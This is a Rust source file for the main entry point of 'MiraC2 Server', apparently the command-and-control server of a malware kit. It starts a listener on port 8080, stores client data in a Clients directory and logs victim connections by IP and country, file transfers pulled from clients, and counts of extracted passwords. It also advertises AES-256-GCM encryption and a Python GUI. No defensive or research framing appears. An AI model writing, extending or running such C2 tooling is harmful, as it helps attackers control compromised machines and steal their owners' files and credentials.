use std::sync::Arc;
use tokio::sync::broadcast;
use tracing::{info, error};
use tracing_subscriber;
use anyhow::Result;
use config::{Config, ConfigError, File};
use serde::{Deserialize, Serialize};
use mira_core::{MiraServer, MiraEvent};

#[derive(Debug, Serialize, Deserialize)]
struct ServerConfig {
    pub default_port: u16,
    pub log_level: String,
    pub clients_dir: String,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            default_port: 8080,
            log_level: "info".to_string(),
            clients_dir: "Clients".to_string(),
        }
    }
}

impl ServerConfig {
    pub fn load() -> Result<Self, ConfigError> {
        // For now, just return default config
        // In a full implementation, we'd use the config crate properly
        Ok(ServerConfig::default())
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    // Load configuration
    let config = ServerConfig::load().unwrap_or_else(|e| {
        eprintln!("Failed to load config: {}. Using defaults.", e);
        ServerConfig::default()
    });

    // Initialize logging
    let log_level = match config.log_level.to_lowercase().as_str() {
        "trace" => tracing::Level::TRACE,
        "debug" => tracing::Level::DEBUG,
        "info" => tracing::Level::INFO,
        "warn" => tracing::Level::WARN,
        "error" => tracing::Level::ERROR,
        _ => tracing::Level::INFO,
    };

    tracing_subscriber::fmt()
        .with_max_level(log_level)
        .with_target(false)
        .init();

    info!("Starting MiraC2 Server");
    info!("Configuration: {:?}", config);

    // Ensure clients directory exists
    tokio::fs::create_dir_all(&config.clients_dir).await?;

    // Create server instance
    let (server, mut event_receiver) = MiraServer::new();

    // Start event processing task
    let event_processor = tokio::spawn(async move {
        while let Ok(event) = event_receiver.recv().await {
            process_event(event).await;
        }
    });

    // Handle shutdown signals
    let shutdown_handler = {
        tokio::spawn(async move {
            // Wait for Ctrl+C
            tokio::signal::ctrl_c().await.expect("Failed to listen for Ctrl+C");
            info!("Shutdown signal received");
        })
    };

    // Start the server
    let server_task = {
        let (mut server, _) = MiraServer::new();
        
        tokio::spawn(async move {
            if let Err(e) = server.start(config.default_port).await {
                error!("Server error: {}", e);
            }
        })
    };

    // Wait for either the server to finish or shutdown signal
    tokio::select! {
        _ = server_task => {
            info!("Server task completed");
        }
        _ = shutdown_handler => {
            info!("Shutdown handler completed");
        }
    }

    // Wait for event processor to finish
    event_processor.abort();
    
    info!("MiraC2 Server shutdown complete");
    Ok(())
}

/// Process events from the server
async fn process_event(event: MiraEvent) {
    match event {
        MiraEvent::ClientConnected(client) => {
            info!("Client connected: {} from {}", client.ip, client.country);
        }
        MiraEvent::ClientDisconnected(ip) => {
            info!("Client disconnected: {}", ip);
        }
        MiraEvent::FileTransferStarted(transfer) => {
            info!("File transfer started: {} from {}", transfer.filename, transfer.client_ip);
        }
        MiraEvent::FileTransferCompleted(ip, filename) => {
            info!("File transfer completed: {} from {}", filename, ip);
        }
        MiraEvent::FileTransferFailed(ip, error) => {
            error!("File transfer failed from {}: {}", ip, error);
        }
        MiraEvent::PasswordsExtracted(passwords) => {
            info!("Extracted {} passwords", passwords.len());
        }
        MiraEvent::ServerStarted(port) => {
            info!("Server listening on port {}", port);
            println!("\n🚀 MiraC2 Server is running!");
            println!("📡 Listening on port: {}", port);
            println!("📁 Client data directory: Clients/");
            println!("🔐 Encryption: AES-256-GCM");
            println!("📊 Python GUI can connect to this server");
            println!("\nPress Ctrl+C to stop the server\n");
        }
        MiraEvent::ServerStopped => {
            info!("Server stopped");
        }
        MiraEvent::ServerError(error) => {
            error!("Server error: {}", error);
        }
        MiraEvent::LogEntry(log_entry) => {
            let timestamp = log_entry.timestamp.format("%H:%M:%S%.3f");
            match log_entry.log_type {
                mira_core::LogType::Error => error!("[{}] {}", timestamp, log_entry.message),
                mira_core::LogType::Warning => tracing::warn!("[{}] {}", timestamp, log_entry.message),
                mira_core::LogType::Info => info!("[{}] {}", timestamp, log_entry.message),
                mira_core::LogType::Connection => info!("[{}] 🔗 {}", timestamp, log_entry.message),
                mira_core::LogType::DataTransfer => info!("[{}] 📁 {}", timestamp, log_entry.message),
                mira_core::LogType::Security => tracing::warn!("[{}] 🔐 {}", timestamp, log_entry.message),
                mira_core::LogType::System => info!("[{}] ⚙️  {}", timestamp, log_entry.message),
            }
        }
        MiraEvent::StatsUpdated(_stats) => {
            // Stats updates are handled by the GUI
        }
        _ => {
            // Handle other events as needed
        }
    }
}